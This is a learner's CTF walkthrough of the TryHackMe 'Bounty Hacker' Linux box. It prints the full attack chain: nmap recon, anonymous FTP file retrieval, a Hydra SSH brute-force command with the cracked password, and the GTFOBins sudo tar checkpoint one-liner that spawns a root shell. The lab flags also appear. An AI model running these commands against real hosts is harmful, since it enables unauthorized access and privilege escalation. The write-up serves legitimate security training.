# Bounty Hacker — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF
**Date:** June 28, 2026
**Flags:** `THM{CR1M3_SyNd1C4T3}` (user) · `THM{80UN7Y_h4cK3r}` (root)

---

## Summary

A Linux box with anonymous FTP access exposing a username and a password list. Used those to brute force SSH with Hydra, got a user shell, then escalated to root through a sudo misconfiguration on `tar`. Faster than RootMe — no reverse shell needed, went straight in over SSH.

---

## Reconnaissance

Combined port scan and version detection in one shot this time:

```
sudo nmap -p- -sV --min-rate 5000 -Pn 10.145.168.220
```

```
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

Three ports. FTP jumped out immediately — anonymous FTP is a classic misconfiguration that's worth checking every time it shows up.

---

## FTP Enumeration

Connected with anonymous login:

```
ftp -p 10.145.168.220
```

Username: `anonymous`, no password needed.

First `ls -la` came back with a passive mode error:

```
550 Permission denied.
Passive mode refused.
```

Had to look up how to fix this — passive mode was on by default and the server wasn't allowing it. Turned it off:

```
passive
```

After that `ls -la` worked and showed two files:

```
locks.txt
task.txt
```

Downloaded both:

```
get task.txt
get locks.txt
```

**task.txt:**
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
-lin
```

That signature at the bottom — `-lin` — is a username. Not hidden, not encrypted, just sitting there signed with a name.

**locks.txt** turned out to be a wordlist. 26 variations on a dragon-themed password. Clearly a password list for something. With a username from task.txt and a password list from locks.txt, SSH is the obvious next target.

---

## SSH Brute Force with Hydra

```
hydra -l lin -P locks.txt 10.145.168.220 ssh -t 4 -f -V
```

**Breaking down the flags:**
- `-l lin` — single username
- `-P locks.txt` — password list file
- `-t 4` — 4 parallel threads (kept low to avoid locking the account)
- `-f` — stop as soon as a valid pair is found
- `-V` — verbose, shows every attempt

Hit on attempt 12:

```
[22][ssh] host: 10.145.168.220   login: lin   password: RedDr4gonSynd1cat3
```

Six seconds total. That's the risk of leaving FTP open with anonymous access — you hand attackers their credentials before they've had to do any real work.

---

## User Shell

```
ssh lin@10.145.168.220
```

Landed directly in lin's Desktop directory:

```
lin@ip-10-145-168-220:~/Desktop$ ls
user.txt

lin@ip-10-145-168-220:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

No reverse shell, no upload, no filter bypass. Just SSH in and the flag was sitting on the Desktop.

---

## Privilege Escalation

First check, same as always:

```
sudo -l
```

```
User lin may run the following commands on ip-10-145-168-220:
    (root) /bin/tar
```

`tar` with sudo — went straight to GTFOBins. The exploit was right there.

```
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**What this does:**

`tar` has a checkpoint feature that runs a command at set intervals during archive operations. `--checkpoint=1` fires after every single file processed. `--checkpoint-action=exec=/bin/sh` runs `/bin/sh` as that action. Since the whole thing runs under `sudo`, the shell it spawns is a root shell. The archive targets (`/dev/null`) are intentional — we're not trying to archive anything real, we just need tar to run and hit its checkpoint.

```
# whoami
root
```

Instant root. No SUID hunting needed this time.

---

## Finding the Root Flag

This is where I fumbled a bit. First tried:

```
find / -name root
```

That came back with `/root` the directory plus about 400 lines of `/proc` entries — every running process has a root symlink in procfs. Completely useless output.

Should have been specific from the start:

```
find / -name root.txt 2>/dev/null
```

That came back clean:

```
/root/root.txt
```

Also tried to `cd` into it like it was a directory:

```
cd /root/root.txt
bash: cd: /root/root.txt: Not a directory
```

That's a file, not a folder. `cat` it:

```
cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

Done.

---

## What I'd Do Differently

**On the FTP passive mode issue:** I didn't know why `ls -la` was failing at first and had to Google it. The reason passive mode was failing is that in passive FTP, the server picks a random port for the data connection and tells the client to connect to it. If the firewall or network path blocks that, it breaks. Active mode reverses it — the client tells the server which port to connect back to. In a lab environment active mode usually works fine. Worth knowing the difference rather than just toggling it and hoping.

**On the find command:** `find / -name root` is too broad. When you're looking for a flag file, always search for the actual filename including the extension: `find / -name root.txt 2>/dev/null`. The `2>/dev/null` suppresses permission errors so the output is clean. I won't make that mistake again.

**On the shell upgrade:** I ran the PTY upgrade sequence after I already had a proper SSH session, which doesn't make sense. The upgrade is for dumb reverse shells coming in over netcat — shells that don't have a real terminal attached. An SSH session already has a proper PTY by default. I also tried to run `stty raw -echo; fg` while already inside the SSH session, which is backwards — that sequence runs on your local Kali terminal before bringing netcat back to the foreground. In an SSH session it's just noise.

---

## Attack Chain

```
Nmap → FTP (21), SSH (22), HTTP (80)
  ↓
Anonymous FTP login
  ↓
task.txt → username: lin
locks.txt → password wordlist
  ↓
Hydra SSH brute force → RedDr4gonSynd1cat3
  ↓
SSH as lin → user flag on Desktop
  ↓
sudo -l → /bin/tar
  ↓
GTFOBins tar checkpoint exploit → root shell
  ↓
cat /root/root.txt → root flag
```

---

## What I Learned

**Anonymous FTP is a real attack surface.** It shows up constantly in CTFs because it shows up constantly in real environments. Any time port 21 is open, try anonymous login first. Configuration files, notes, credentials, and password lists have all been found this way in the wild.

**The sudo misconfiguration here is more dangerous than the SUID one from RootMe.** SUID requires someone to have made a configuration mistake at the binary level. A sudo entry for tar means someone explicitly granted it — probably thinking "tar is just for archiving files, what's the harm?" GTFOBins documents over 300 binaries that can be abused when running with elevated privileges. The lesson is that almost any program can be weaponized if it can run as root.

**Active vs passive FTP:** Passive — server picks the data port, client connects to it. Active — client picks the data port, server connects back to it. When passive fails, try active. Know which mode you're in before assuming the server is broken.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scan and version detection |
| ftp | Anonymous FTP login and file retrieval |
| hydra | SSH brute force with credential list |
| ssh | Direct access with found credentials |
| GTFOBins | tar sudo exploit reference |

## References

- GTFOBins tar: https://gtfobins.github.io/gtfobins/tar/
- Hydra usage: `hydra -h` or `man hydra`
- Active vs passive FTP: https://slacksite.com/other/ftp.html
